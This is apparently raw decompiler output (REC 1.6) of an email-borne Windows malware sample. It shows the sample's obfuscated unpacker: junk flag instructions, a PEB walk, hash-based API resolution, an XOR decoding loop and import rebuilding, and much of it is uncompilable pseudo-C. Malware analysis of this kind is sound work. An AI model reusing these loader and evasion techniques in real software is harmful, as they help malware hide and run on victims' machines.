/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_1492/ia32_pe/subject.exe'
 */

/*	Procedure: 0x0040102F - 0x00401079
 *	Argument size: -29184
 *	Local size: 0
 *	Save regs size: 0
 */

L0040102F()
{



    bl = 182;
    asm("%d add dl,ch");
    asm("xchg eax,edi");
    != ? 0x40104e : ;
    (restore)esi;
    esp = 270532608;
    ah = eax + 1 + bl;
    *eax = *eax + al;
    *eax = *eax + al;
    (save)es;
    return;
    *(ebp + 302819636) = *(ebp + 302819636) | -1510701019;
    asm("fnstcw [ecx+esi*8+0x9cde8900]");
    asm("cmc");
    asm("popf");
    edi = 4194304;
    asm("pushf");
    asm("popf");
    ecx = 151552;
    asm("rep movsb");
    (save)4260656;
    asm("pushf");
    asm("stc");
    asm("popf");
    eax = 0;
    asm("pushf");
    asm("stc");
    asm("popf");
}

/*	Procedure: 0x0040107A - 0x004010A3
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040107A()
{



    *(ebx + 51) = *(ebx + 51) + bh;
    (save)ds;
    *LF100C4B2 = eax;
    asm("sahf");
    *L00B10052 = al;
    *eax = *eax + al;
    *eax = *eax + al;
    if(!( *eax = *eax + al)) {
    }
    *eax = *eax + dh;
    *eax = *eax + al;
    *eax = *eax + al;
    (save)edi;
    *eax = *eax + al;
    (fsave)(frestore) + *eax;
    *eax = *eax + al;
    *(esi + 102) = *(esi + 102) + dl;
}

/* DEST BLOCK NOT FOUND: 004013b5 -> 0040144b */
/*	Procedure: 0x004010A4 - 0x00401417
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__()
{



    asm("rol si,0x9");
    eax = -112;
    asm("rol di,0x4");
    esi = 90175673;
    asm("rol esi,0x4");
    ecx = ecx + -113572517;
    edi = esp << 24;
    asm("ror dx,0x6");
    edi = edi >> 24;
    ecx = 2489856;
    asm("ror ecx,0x1");
    ecx = ecx + edi;
    asm("Unknown opcode 0xc1");
    asm("Unknown opcode 0xf6");
    al = al | 139;
    asm("adc [esi-0x7d],esp");
    *(ecx + 66) = *(ecx + 66) >> 71;
L004010de:
    if(*%ss:edx] != eax) {
        ecx = ecx - ebp;
        if(*%ss:edx] != esi) {
            ecx = ecx + eax;
            goto L004010de;
        }
        edx = edx - 1;
        ecx = -2147483644;
        asm("rol ecx,0x5");
        if(*edx != cl) {
L004010fd:
            ecx = ecx - 1;
            goto L004010fd;
        }
    } else {
        edx = edx + 4;
        ecx = 2040;
        asm("ror ecx,0x3");
        if(*edx != cl) {
            ecx = ecx + *esp;
        }
    }
    asm("rol cx,0x1");
    edi = esp;
    asm("rol ax,0xb");
    esi = *edi;
    edx = edx ^ ecx;
    ecx = esi;
L00401129:
    ecx = ecx - 1;
    esi = 201326595;
    asm("rol esi,0x6");
    di = di | -2;
    if(*%ss:ecx] != esi) {
        asm("rol dx,0x4");
        goto L00401129;
    }
    esi = !esi;
    eax = *ecx();
    edx = 3319179;
    asm("rol ax,0xa");
    edx = edx + -3319131;
    esi = esi + 1;
    edi = edi ^ ebx;
    eax = 12;
    ecx = *%fs:edx] + 12;
    asm("rol edx,0x16");
    esi = *ecx;
    di = di - 18;
    eax = eax + eax;
    esi = esi + 28;
    dx = dx + 86;
    eax = *esi;
    cx = -54;
    edx = *eax;
    eax = eax + -1229298136;
    edi = *(edx + 8);
    edx = edx + -28148412;
    eax = eax + -54;
    edx = edx + 1;
    eax = L00401469(edi, -1356234318);
    eax = eax + ecx;
    edi = 1818504812;
    (save)108;
    esi = 108 ^ edx;
    (save)1818504812;
    asm("ror di,0xf");
    (save)1818522734;
    asm("Unknown opcode 0xc1");
    asm("Unknown opcode 0xf6");
    asm("Unknown opcode 0x0f");
    (save)esp;
    eax = *edx();
    esp = esp - -12;
    esi = esi + *esp;
    eax = L00401469(eax, -822240170);
    eax = edx;
    edi = 0;
    (save)0;
    ecx = 0;
    (save)0;
    esi = 0;
    (save)0;
    (save)13695504;
    (save)-1841299569;
    (save)3127;
    eax = *eax();
    edx = ~edx;
    eax = 3127;
    ecx = 0;
    ds = 3127;
    asm("rol cx,0x4");
    edi = 3112446;
L00401209:
    edx = edx ^ ebp;
    esi = *edi;
    ecx = ecx | 1697802484;
    eax = *esi();
    edi = edi << 255;
    asm("Unknown opcode 0xff");
    edi = edi & edx;
    ds = 35;
    eax = 35 & esi;
    edx = 48;
    ecx = !ecx;
    esi = *%fs:edx];
    ecx = *(esi + 12);
    asm("Unknown opcode 0xc1");
    asm("repne adc ecx,[ebx+0x8b4e1c41]");
    asm("adc [ecx+0xd140ecc8],al");
    if(di = di + -82) {
        goto L00401209;
    }
    *eax = *eax | al;
    *eax = *eax + al;
    ecx = ecx - 1500535620;
    edx = edx + esi;
    esi = esi & 104622771;
    edi = *edx;
    edx = edx & ebx;
    ax = ax - -126;
    ebp = edi;
    eax = L00401469(edi, 702120982);
    (save)151856;
    (save)64;
    ebx = *edx();
    *(eax - -151554) = ebp;
    L00401469(ebp, -1356234318);
    edi = ebx + 151571;
    *edi = edx;
    eax = L00401469(ebp, 605659588);
    edi = ebx - -151595;
    *edi = edx;
    eax = L00401469(ebp, 337774723);
    eax = esp - 104;
    (save)eax;
    esi = 64;
    (save)64;
    esi = *L0040003C + 4194304;
    (save) *(esi + 80);
    (save)4194304;
    eax = *edx();
    eax = 0x401091;
    edi = *L00401091;
    edx = 0;
    ecx = 47778;
    asm("pushf");
    asm("stc");
    asm("popf");
    eax = 4194548 + edi;
    dl = *eax;
    if(edx != 0) {
        asm("pushf");
        asm("cmc");
        asm("popf");
        dl = dl ^ 203;
        asm("pushf");
        asm("wait");
        asm("popf");
        if(edx != 0) {
            *eax = dl;
        }
        asm("pushf");
        asm("stc");
        asm("popf");
    }
    asm("pushf");
    asm("cmc");
    asm("popf");
    eax = eax + 1;
    asm("pushf");
    asm("clc");
    asm("popf");
    asm("loop 0x4012f7");
    asm("pushf");
    asm("wait");
    asm("popf");
    asm("pusha");
    asm("pushf");
    asm("cld");
    asm("popf");
    edi = ebx;
    eax = 0x401091;
    asm("pushf");
    asm("cld");
    asm("popf");
    esi = *eax + 4194548;
    asm("pushf");
    asm("popf");
    asm("cld");
    asm("pushf");
    asm("popf");
    dl = 128;
    asm("pushf");
    asm("wait");
    asm("popf");
    ebx = 0;
L00401341:
    *edi = *esi;
    edi = edi + 1;
    bl = 2;
L00401344:
    L00401418();
    if(esi = esi + 1) {
        goto L00401341;
    }
    ecx = 0;
    eax = L00401418();
    >= ? L00401397 : ;
    eax = 0;
    eax = L00401418();
    >= ? L004013b1 : ;
    bl = 2;
    asm("pushf");
    asm("cmc");
    asm("popf");
    asm("pushf");
    asm("popf");
    al = 16;
L00401374:
    eax = L00401418();
    asm("pushf");
    asm("clc");
    asm("popf");
    asm("adc al,al");
    if(ecx = ecx + 1) {
        goto L00401374;
    }
    asm("wait");
    != ? 0x401405 : ;
    *edi = al;
    edi = edi + 1;
    asm("fnop");
    asm("wait");
    goto L00401344;
    eax = L00401431();
    asm("pushf");
    asm("stc");
    asm("popf");
    if(!(ecx = ecx - ebx)) {
        L0040142C();
        goto L004013fb;
        al = *esi;
        eax = eax >> 1;
        if(esi = esi + 1) {
            goto L0040144b;
        }
        asm("adc ecx,ecx");
    } else {
        asm("xchg eax,ecx");
        asm("pushf");
        asm("wait");
        asm("popf");
        eax = eax - 1 << 8;
        al = *esi;
        esi = esi + 1;
        eax = L0040142C();
        if(eax < 32000) {
            if(ah >= 5) {
                goto L004013f2;
            }
            if(eax > 127) {
                goto L004013f6;
            }
        }
    }
    ecx = ecx + 1;
L004013f2:
    asm("pushf");
    asm("stc");
    asm("popf");
    ecx = ecx + 1;
L004013f6:
    asm("pushf");
    asm("clc");
    asm("popf");
    asm("xchg ebp,eax");
L004013fb:
    asm("pushf");
    asm("clc");
    asm("popf");
    eax = ebp;
    asm("pushf");
    asm("popf");
    bl = 1;
    (save)esi;
    esi = edi;
    asm("pushf");
    asm("popf");
    esi = esi - eax;
    asm("rep movsb");
    asm("pushf");
    asm("wait");
    asm("popf");
    (restore)esi;
    goto L00401344;
}

/* DEST BLOCK NOT FOUND: 0040141d -> 0040142b */
/*	Procedure: 0x00401418 - 0x0040142B
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401418()
{



    asm("pushf");
    asm("stc");
    asm("popf");
    if(!(dl = dl + dl)) {
        dl = *esi;
        esi = esi + 1;
        asm("pushf");
        asm("cmc");
        asm("popf");
        asm("adc dl,dl");
    }
}

/*	Procedure: 0x0040142C - 0x00401430
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040142C()
{



    ecx = 0;
    asm("pushf");
    asm("wait");
    asm("popf");
}

stack space not deallocated on return
/*	Procedure: 0x00401431 - 0x00401468
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401431()
{



    asm("pushf");
    asm("cld");
    asm("popf");
    do {
        L00401418();
        asm("pushf");
        asm("wait");
        asm("popf");
        asm("adc ecx,ecx");
        eax = L00401418();
    } while(ecx = ecx + 1);
    return;
    asm("popa");
    asm("pushf");
    asm("stc");
    asm("popf");
    eax = L0040151A();
    esi = 0x401058;
    (save)151552 + ebx;
    ecx = 34;
    asm("rep movsb");
}

/*	Procedure: 0x00401469 - 0x00401519
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 16
 */

L00401469(A14, A18)
/* unknown */ void  A14;
/* unknown */ void  A18;
{
	/* unknown */ void  eax;
	/* unknown */ void  ecx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffffc;



    edi = edi + *esp;
    ecx = A14;
    esi = ecx;
    eax = eax + 1;
    ecx = ecx + 18 - -42;
    edi = !edi;
    eax = *ecx;
    edi = *(ecx + 112 + -52 + eax) - -45 - 17 + esi;
    edx = *edi + esi;
    edi = edi + 4;
    eax = *edi + esi;
    (save) *(edi + 4) + esi;
    (save)edx;
    asm("xchg eax,edx");
    esi = A18;
    (save)0;
    ecx = A14;
    edi = ecx;
    ecx = ecx + *edx;
    for(eax = 0; 1; eax = 0) {
        al = al + *ecx;
        asm("ror eax,0x7");
        ecx = ecx + 1;
        eax = eax ^ 837579073;
        if(*ecx != 0) {
            continue;
        }
        eax = eax ^ esi;
        == ? L004014f4 : ;
        edx = edx - -4;
        ecx = *edx + edi;
        (restore)eax;
        (save)eax + 1;
    }
    (restore)eax;
    ecx = Vfffffffc + (eax << 1);
    esi = ( *ecx & 65535) << 2;
    (restore)ecx;
    (save)ecx;
    ecx = ecx + esi;
    (restore)esi;
    edx = *ecx;
    (restore)eax;
    edx = edx + edi;
}

/*	Procedure: 0x0040151A - 0x00401619
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040151A()
{



    asm("pusha");
    ecx = ebx;
    edx = 78624 + ecx;
    for(*(ebx + 151605) = ecx; 1; edx = edx + 20) {
        esi = *(edx + 12);
        if(esi == 0) {
            break;
        }
        (save)edx;
        (save)esi;
        eax = *(edx + 16);
        *(ebx - -151643) = eax;
        edi = *edx;
        *(ebx - -151622) = edi;
        if(edi == 0) {
            edi = *(edx + 16);
        }
        ecx = *(ebx + 151605);
        *esp = *esp + ecx;
        (restore)esi;
        edi = edi + ecx;
        *(ebx + 151654) = edi;
        (save) *(ebx + 151654);
        (save)esi;
        for(*(ebx + 151664) = *( *(ebx + 151571))(); 1; *(ebx + 151654) = *(ebx - -151654) - -4) {
            eax = *( *(ebx + 151654));
            if(eax == 0) {
                break;
            }
            if(!(eax & -2147483648)) {
                if(!(eax = eax - -2)) {
                    goto L004015a7;
                }
                eax = eax + *(ebx + 151605);
            } else {
L004015a7:
                eax = eax & 2147483647;
            }
            eax = *( *(ebx + 151595))( *(ebx - -151664), eax);
            ecx = *(ebx + 151643);
            *(ecx + *(ebx + 151605)) = eax;
            ecx = *(ebx + 151643) - -4;
            *(ebx + 151643) = ecx;
        }
        esp = esp - -4;
        (restore)edx;
    }
    asm("popa");
}

/*	Procedure: 0x0040161A - 0x00000000
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040161A()
{



}

/* address  size  */
/* 0x004010a4       0 */ /* unknown */ void 	__entry_point__;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
